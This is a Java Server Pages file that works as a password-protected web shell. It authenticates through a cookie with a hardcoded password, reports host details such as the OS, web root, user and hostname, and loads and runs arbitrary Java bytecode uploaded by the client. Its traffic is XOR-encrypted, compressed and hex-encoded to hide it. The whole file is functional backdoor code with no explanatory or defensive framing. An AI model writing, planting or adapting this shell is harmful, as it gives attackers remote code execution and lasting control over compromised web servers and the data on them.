<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.util.zip.GZIPInputStream" %>
<%@ page import="java.util.zip.GZIPOutputStream" %>
<%!
    String _output = "";

    class U extends ClassLoader
    {
        U(ClassLoader c)
        {
            super(c);
        }
        public Class g(byte[] b)
        {
            return super.defineClass(b, 0, b.length);
        }
    }

    public class Handler
    {

        public final String  REQUEST_METHOD                  = "POST";
        private final String PASSWORD_TYPE                   = "COOKIE";
        private final String PASSWORD_KEY                    = "X-Authorization";
        private final String PASSWORD_VALUE                  = "P4ssw0rd!";
        private final String REQUEST_DATA_TYPE               = "FIELD";
        private final String REQUEST_DATA_KEY                = "data";
        private final String RESPONSE_DATA_KEY               = "data";

        private final String SUCC_CODE                       = "0";
        private final String ERR_CODE                        = "1";
        private final String FIELD_SEPARATOR                 = ",";
        private final String VALUE_SEPARATOR                 = "=";
        private final String CUSTOM_SEPARATOR                = "|";

        private final String REQ_ACTION_KEY                  = "action";
        private final String REQ_MSG_KEY                     = "data";

        private final String REQ_MOD_NAME_KEY                = "name";
        private final String REQ_MOD_CONTENT_KEY             = "content";
        private final String REQ_MOD_ARGS_KEY                = "args";
        private final String REQ_MOD_CWD_KEY                 = "cwd";

        private final String MOD_ARGS_VAR                    = "#{ARGS}";
        private final String MOD_CWD_VAR                     = "#{CWD}";

        private final String RES_STATUS_KEY                  = "status";
        private final String RES_MESSAGE_KEY                 = "message";
        
        private final String ACTION_STATUS                   = "0";
        private final String ACTION_INVOKE                   = "1";

        private final String MODULE_INVOKE_METHOD            = "go";
        private final String MODULE_RESP_STATUS              = "status";
        private final String MODULE_RESP_MESSAGE             = "message";

        private final String ERR_INVALID_REQ_TYPE            = "invalid request type";
        private final String ERR_INVALID_REQ_METHOD          = "invalid request method";
        private final String ERR_NONEXISTENT_DATA            = "non-existent data";
        private final String ERR_NONEXISTENT_ACTION          = "non-existent action";
        private final String ERR_UNKNOWN_ACTION              = "unknown action code";
        private final String ERR_EXCEPTION_FROM_MODULE       = "module throw an exception";
        private final String ERR_NONEXISTENT_ACTION_DATA     = "non-existent action data";
        private final String ERR_NONEXISTENT_MOD_NAME        = "non-existent module name";
        private final String ERR_NONEXISTENT_MOD_CONTENT     = "non-existent module content";
        private final String ERR_NONEXISTENT_MOD_ARGS        = "non-existent module args";
        private final String ERR_NONEXISTENT_MOD_CWD         = "non-existent module cwd";
        private final String ERR_INVALID_MOD_RESPONSE        = "invalid module response";

        private HttpServletRequest request;
        private HttpServletResponse response;
        private HttpSession session;


        public Handler(HttpServletResponse response, HttpServletRequest request, HttpSession session)
        {
            this.response = response;
            this.request = request;
            this.session = session;
        }

        private String get_field(String type, String name) throws Exception
        {

            if (type.equals("HEADER"))
            {
                return this.request.getHeader(name);
            }
            else if (type.equals("COOKIE"))
            {
                Cookie[] cookie_list = request.getCookies();
                if (cookie_list == null)
                    return null;

                for (int i = 0; i < cookie_list.length; i++)
                { 
                    Cookie c = cookie_list[i];

                    String cookie_name = c.getName();
                    String cookie_value = c.getValue();

                    if (cookie_name.equals(name))
                        return cookie_value;
                }
                return null;
            }
            else if (type.equals("FIELD"))
            {
                if ((REQUEST_METHOD.equals("GET") == false) && (REQUEST_METHOD.equals("POST") == false))
                {
                    throw new Exception(ERR_INVALID_REQ_METHOD);
                }

                return this.request.getParameter(name);
            }
            else
            {
                throw new Exception(ERR_INVALID_REQ_TYPE);
            }
        }

        private byte[] crypt(byte[] data)
        {
            int password_len = PASSWORD_VALUE.length();
            byte[] password_bytes = PASSWORD_VALUE.getBytes();
            for (int i = 0; i < data.length; i++)
                data[i] = (byte)(data[i] ^ password_bytes[i % password_len]);
            return data;
        }

        private byte[] hex2bin(String data) throws Exception
        {
            if ((data.length() % 2) == 1)
                throw new Exception("hex2bin(): data cannot have an odd number of digits");
            
            byte[] data_bytes = new byte[data.length() / 2];
            for (int i = 0; i < data.length(); i += 2)
            {
                String hs = data.substring(i, i + 2);
                try
                {
                    int val = Integer.parseInt(hs, 16);
                    data_bytes[i/2] = (byte)val;
                }
                catch(Exception e)
                {
                    throw new Exception("hex2bin() failed to convert hex:'" + hs + "' to byte");
                }
            }
            return data_bytes;
        }

        private String bin2hex(byte[] ba) throws Exception
        {
            try
            {
                StringBuilder sb = new StringBuilder(ba.length * 2);
                for (byte b: ba)
                    sb.append(String.format("%02x", b));
                return sb.toString();
            }
            catch(Exception e)
            {
                throw new Exception("bin2hex() failed");
            }
        }

        private String protect(String data) throws Exception
        {
            byte[] data_raw_bytes   = data.getBytes();
            byte[] compressed       = compress(data_raw_bytes);
            byte[] data_crypt_bytes = crypt(compressed);
            String data_crypt_hex   = bin2hex(data_crypt_bytes);
            return data_crypt_hex;
        }

        private String unprotect(String data) throws Exception
        {
            try
            {
                byte[] data_crypt       = hex2bin(data);
                byte[] data_dec_hex     = crypt(data_crypt);
                byte[] uncompressed     = decompress(data_dec_hex);
                return new String(uncompressed);
            }
            catch(IOException e)
            {
                throw new Exception("unprotect() failed");
            }
        }
        
        private byte[] compress(byte[] data) throws Exception
        {
            try
            {
                ByteArrayOutputStream obj = new ByteArrayOutputStream();
                GZIPOutputStream gzip = new GZIPOutputStream(obj);
                gzip.write(data);
                gzip.flush();
                gzip.close();
                return obj.toByteArray();
            }
            catch(IOException e)
            {
                throw new Exception("compress() failed");
            }
        }

        private byte[] decompress(byte[] compressed) throws Exception
        {
            GZIPInputStream gis = new GZIPInputStream(new ByteArrayInputStream(compressed));
            byte[] buffer = new byte[1024];
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int len;
            while ((len = gis.read(buffer)) > 0)
            {
                out.write(buffer, 0, len);
            }
            gis.close();
            out.close();
            return out.toByteArray();
        }

        private String pack_value(String key, String val, Boolean end) throws Exception
        {
            if (end)
            {
                return key + VALUE_SEPARATOR + val;
            }
            else
            {
                byte[] val_bytes   = val.getBytes();
                return key + VALUE_SEPARATOR + bin2hex(val_bytes);
            }
        }

        private Map<String, String> unpack_data(String data) throws Exception
        {
            String[] fields = data.split(FIELD_SEPARATOR);
            if (fields.length < 1)
                throw new Exception("unpack_data(): Split() fields < 1");
            
            Map<String, String> dict = new HashMap<String, String>();
            for (String field: fields)
            {
                if (field.equals(REQ_MOD_ARGS_KEY + VALUE_SEPARATOR))
                {
                    dict.put(REQ_MOD_ARGS_KEY, "");
                    continue;
                }

                String[] vals = field.split(VALUE_SEPARATOR);
                if (vals.length == 1)
                {
                    dict.put(vals[0], "");
                    continue;
                }

                if (vals.length != 2)
                {
                    throw new Exception("unpack_data(): Split() values != 2");
                }
                    
                
                dict.put(vals[0], vals[1]);
            }
            return dict;
        }

        private String generate_response(String status, String message) throws Exception
        {
            String response = "";
            response += RES_STATUS_KEY + VALUE_SEPARATOR + status + FIELD_SEPARATOR;
            byte[] message_raw_bytes = message.getBytes();
            String message_enc_str = bin2hex(message_raw_bytes);
            response += RES_MESSAGE_KEY + VALUE_SEPARATOR + message_enc_str;
            return pack_value(RESPONSE_DATA_KEY, protect(response), true);
        }

        private String stack_trace_to_str(Exception e)
        {
            StringWriter errors = new StringWriter();
            e.printStackTrace(new PrintWriter(errors));
            return errors.toString();
        }

        private String get_so()
        {
            String os_name = System.getProperty("os.name");
            if (os_name.startsWith("Windows"))
                os_name = "Windows";
            return os_name;
        }

        public Boolean authenticate()
        {
            try
            {
                String request_password = get_field(PASSWORD_TYPE, PASSWORD_KEY);
                if (request_password == null)
                    return false;
                if (request_password.equals(PASSWORD_VALUE) == false)
                    return false;
                return true;
            }
            catch(Exception e)
            {
                return false;
            }
        }
        
        private String do_status() throws Exception
        {
            String response = "";
            response += pack_value("so", get_so(), false);
            response += FIELD_SEPARATOR;
            response += pack_value("pwd", getServletContext().getRealPath("/").replace("\\", "/"), false);
            response += FIELD_SEPARATOR;
            response += pack_value("type", "java", false);
            response += FIELD_SEPARATOR;
            response += pack_value("version", System.getProperty("java.version"), false);
            response += FIELD_SEPARATOR;
            response += pack_value("user", System.getProperty("user.name"), false);
            response += FIELD_SEPARATOR;
            response += pack_value("hostname", InetAddress.getLocalHost().getHostName(), false);
            return generate_response(SUCC_CODE, response);
        }

        private String do_invoke(Map<String, String> unpacked_request) throws Exception
        {
            if (unpacked_request.containsKey(REQ_MSG_KEY) == false)
                return generate_response(ERR_CODE, ERR_NONEXISTENT_ACTION_DATA);

            byte[] action_data_bytes = hex2bin(unpacked_request.get(REQ_MSG_KEY));
            String action_data_str = new String(action_data_bytes);
            
            Map<String, String> action_data_unpack = unpack_data(action_data_str);
            if (action_data_unpack.containsKey(REQ_MOD_NAME_KEY) == false)
                return generate_response(ERR_CODE, ERR_NONEXISTENT_MOD_NAME);
            if (action_data_unpack.containsKey(REQ_MOD_CONTENT_KEY) == false)
                return generate_response(ERR_CODE, ERR_NONEXISTENT_MOD_CONTENT);
            if (action_data_unpack.containsKey(REQ_MOD_ARGS_KEY) == false)
                return generate_response(ERR_CODE, ERR_NONEXISTENT_MOD_ARGS);
            if (action_data_unpack.containsKey(REQ_MOD_CWD_KEY) == false)
                return generate_response(ERR_CODE, ERR_NONEXISTENT_MOD_CWD);

            byte[] mod_name_bytes  = hex2bin(action_data_unpack.get(REQ_MOD_NAME_KEY));
            String mod_name = new String(mod_name_bytes);
            byte[] mod_content_bytes  = hex2bin(action_data_unpack.get(REQ_MOD_CONTENT_KEY));
            String mod_args = action_data_unpack.get(REQ_MOD_ARGS_KEY);
            String mod_cwd = action_data_unpack.get(REQ_MOD_CWD_KEY);

            Class clazz = new U(this.getClass().getClassLoader()).g(mod_content_bytes);
            Object obj = clazz.newInstance();

            Method method = clazz.getDeclaredMethod(MODULE_INVOKE_METHOD, String.class, String.class);
            String[] result = (String[]) method.invoke(obj, mod_cwd, mod_args);

            if (result.length != 2)
                return generate_response(ERR_CODE, ERR_INVALID_MOD_RESPONSE);

            String status_code = result[0];
            String message = result[1];

            return generate_response(status_code, message);
        }

        public String handle() throws Exception
        {
            try
            {
                String raw_request_data = get_field(REQUEST_DATA_TYPE, REQUEST_DATA_KEY);
                if (raw_request_data == null)
                    return generate_response(ERR_CODE, ERR_NONEXISTENT_DATA);

                String request_data = unprotect(raw_request_data);
                Map<String, String> unpacked_request = unpack_data(request_data);

                if (unpacked_request.containsKey(REQ_ACTION_KEY) == false)
                    return generate_response(ERR_CODE, ERR_NONEXISTENT_ACTION);

                if (unpacked_request.get(REQ_ACTION_KEY).equals(ACTION_STATUS))
                    return do_status();
                else if(unpacked_request.get(REQ_ACTION_KEY).equals(ACTION_INVOKE))
                    return do_invoke(unpacked_request);
                else
                    return generate_response(ERR_CODE, ERR_UNKNOWN_ACTION);
            }
            catch(Exception e)
            {
                return generate_response(ERR_CODE, ERR_EXCEPTION_FROM_MODULE + "\n" + stack_trace_to_str(e));
            }
        }
    }
%>
<%
    Handler handler = new Handler(response, request, session);

    if (request.getMethod().equals(handler.REQUEST_METHOD))
    {
        if (handler.authenticate())
        {
            response.setStatus(HttpServletResponse.SC_OK);
            _output = handler.handle();
            response.setContentLength(_output.length());
            response.getWriter().write(_output);
        }
        else
        {
            response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
        }
    }
    else
    {
        response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
    }
%>